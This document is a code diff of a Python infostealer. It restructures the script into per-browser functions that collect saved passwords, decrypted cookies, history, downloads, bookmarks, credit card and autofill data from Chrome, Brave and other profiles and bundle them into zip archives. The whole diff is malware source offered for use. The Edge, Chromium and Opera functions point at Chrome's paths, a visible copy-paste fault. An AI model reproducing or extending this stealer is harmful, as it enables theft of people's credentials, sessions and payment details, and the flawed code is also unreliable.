@@ -138,7 +138,7 @@ def fetch_passwords(db_dir, keyDir):
     except:
         pass
 
-fetch_passwords(r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
+#fetch_passwords(r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
 
 ##
 ##Extract cookies
@@ -165,7 +165,7 @@ def fetch_cookies(dir):
     except:
         pass
 
-fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
+#fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
 
 ##
 ##Extract encrypted cookies and decrypt them
@@ -193,7 +193,7 @@ def decrypt_fetch_cookies(dir, keyDir):
     except:
         pass
 
-decrypt_fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
+#decrypt_fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
 
 ##
 ##Extract history
@@ -222,7 +222,7 @@ def fetch_history(dir):
         pass
     
     
-fetch_history(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History")
+#fetch_history(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History")
 
 ##
 ##Extract downloads
@@ -250,7 +250,7 @@ def fetch_downloads(dir):
     except:
         pass
     
-fetch_downloads(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History")
+#fetch_downloads(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History")
 
 ##
 ##Extract bookmarks
@@ -296,7 +296,7 @@ def fetch_bookmarks(dir):
     except:
         pass
         
-fetch_bookmarks(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks")
+#fetch_bookmarks(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks")
 
 ##
 ##Extract credit cards
@@ -325,7 +325,7 @@ def fetch_payment(dir, keyDir):
     except:
         pass
 
-fetch_payment(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
+#fetch_payment(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
 
 ##
 ##Extract autofill
@@ -353,7 +353,7 @@ def fetch_autofill(dir):
     except:
         pass
     
-fetch_autofill(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data")
+#fetch_autofill(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data")
 
 
 ##
@@ -371,4 +371,70 @@ def zip(name, files):
     except:
         pass
     
-zip("Brave.zip", ["file1.txt", "file3.txt", "file2.txt"])
+#zip("Brave.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+
+
+def chrome():
+    fetch_passwords(r"AppData/Local/Google/Chrome/User Data/Default/Login Data", r"AppData/Local/Google/Chrome/User Data/Local State")
+    decrypt_fetch_cookies(r"AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", r"AppData/Local/Google/Chrome/User Data/Local State")
+    #fetch_cookies(r"AppData\Local\Google\Chrome\User Data\Default\Network\Cookies")
+    fetch_history(r"AppData\Local\Google\Chrome\User Data\Default\History")
+    fetch_downloads(r"AppData\Local\Google\Chrome\User Data\Default\History")
+    fetch_bookmarks(r"AppData\Local\Google\Chrome\User Data\Default\Bookmarks")
+    fetch_payment(r"AppData\Local\Google\Chrome\User Data\Default\Web Data", r"AppData/Local/Google/Chrome/User Data/Local State")
+    fetch_autofill(r"AppData\Local\Google\Chrome\User Data\Default\Web Data")
+    zip("Chrome.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+    
+def brave():
+    fetch_passwords(r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
+    decrypt_fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
+    #fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
+    fetch_history(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History")
+    fetch_downloads(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History")
+    fetch_bookmarks(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks")
+    fetch_payment(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data", r"AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
+    fetch_autofill(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data")
+    zip("Brave.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+    
+def edge():
+    fetch_passwords(r"AppData/Local/Google/Chrome/User Data/Default/Login Data", r"AppData/Local/Google/Chrome/User Data/Local State")
+    decrypt_fetch_cookies(r"AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", r"AppData/Local/Google/Chrome/User Data/Local State")
+    #fetch_cookies(r"AppData\Local\Google\Chrome\User Data\Default\Network\Cookies")
+    fetch_history(r"AppData\Local\Google\Chrome\User Data\Default\History")
+    fetch_downloads(r"AppData\Local\Google\Chrome\User Data\Default\History")
+    fetch_bookmarks(r"AppData\Local\Google\Chrome\User Data\Default\Bookmarks")
+    fetch_payment(r"AppData\Local\Google\Chrome\User Data\Default\Web Data", r"AppData/Local/Google/Chrome/User Data/Local State")
+    fetch_autofill(r"AppData\Local\Google\Chrome\User Data\Default\Web Data")
+    zip("Edge.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+
+def chromium():
+    fetch_passwords(r"AppData/Local/Google/Chrome/User Data/Default/Login Data", r"AppData/Local/Google/Chrome/User Data/Local State")
+    decrypt_fetch_cookies(r"AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", r"AppData/Local/Google/Chrome/User Data/Local State")
+    #fetch_cookies(r"AppData\Local\Google\Chrome\User Data\Default\Network\Cookies")
+    fetch_history(r"AppData\Local\Google\Chrome\User Data\Default\History")
+    fetch_downloads(r"AppData\Local\Google\Chrome\User Data\Default\History")
+    fetch_bookmarks(r"AppData\Local\Google\Chrome\User Data\Default\Bookmarks")
+    fetch_payment(r"AppData\Local\Google\Chrome\User Data\Default\Web Data", r"AppData/Local/Google/Chrome/User Data/Local State")
+    fetch_autofill(r"AppData\Local\Google\Chrome\User Data\Default\Web Data")
+    zip("Chromium.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+
+def opera():
+    fetch_passwords(r"AppData/Local/Google/Chrome/User Data/Default/Login Data", r"AppData/Local/Google/Chrome/User Data/Local State")
+    decrypt_fetch_cookies(r"AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", r"AppData/Local/Google/Chrome/User Data/Local State")
+    #fetch_cookies(r"AppData\Local\Google\Chrome\User Data\Default\Network\Cookies")
+    fetch_history(r"AppData\Local\Google\Chrome\User Data\Default\History")
+    fetch_downloads(r"AppData\Local\Google\Chrome\User Data\Default\History")
+    fetch_bookmarks(r"AppData\Local\Google\Chrome\User Data\Default\Bookmarks")
+    fetch_payment(r"AppData\Local\Google\Chrome\User Data\Default\Web Data", r"AppData/Local/Google/Chrome/User Data/Local State")
+    fetch_autofill(r"AppData\Local\Google\Chrome\User Data\Default\Web Data")
+    zip("Opera.zip", ["autofill.txt", "cards.txt", "bookmarks.txt", "downloads.txt", "history.txt", "passwords.txt", "decrypted-cookies.txt", "cookies.txt"])
+
+def run():
+    chrome()
+    brave()
+    edge()
+    chromium()
+    opera()
+    
+
+brave()
